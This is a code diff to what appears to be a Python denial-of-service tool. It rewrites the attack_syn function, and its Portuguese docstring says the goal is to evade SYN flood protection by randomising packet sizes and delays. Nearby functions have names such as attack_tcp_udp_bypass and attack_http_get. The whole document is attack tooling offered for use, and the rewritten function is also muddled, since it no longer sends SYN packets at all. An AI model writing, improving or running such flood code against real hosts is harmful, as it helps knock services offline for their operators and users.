@@ -1,6 +1,7 @@
 import socket
 import threading
 import time
+import os
 import random
 
 # Configuration
@@ -120,14 +121,24 @@ def attack_tcp_udp_bypass(ip, port, secs):
 
 
 def attack_syn(ip, port, secs):
+    """Melhorado para contornar a proteção de SYN flood com variação de pacotes."""
+    PACKET_SIZES = [64, 128, 256, 512, 1024]
+    DELAYS = (0.01, 0.5)
+
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    while time.time() < secs:
-        s.setblocking(0)
-        try:
-            dport = random.randint(1, 65535) if port == 0 else port
-            s.connect((ip, dport))
-        except:
-            pass
+    s.setblocking(0)
+    
+    try:
+        s.connect((ip, port))
+        while time.time() < secs:
+            packet_size = random.choice(PACKET_SIZES)
+            packet = os.urandom(packet_size)
+            delay = random.uniform(*DELAYS)
+    
+            s.send(packet)
+            time.sleep(delay)
+    except Exception as e:
+        pass
 
 
 def attack_http_get(ip, port, secs):
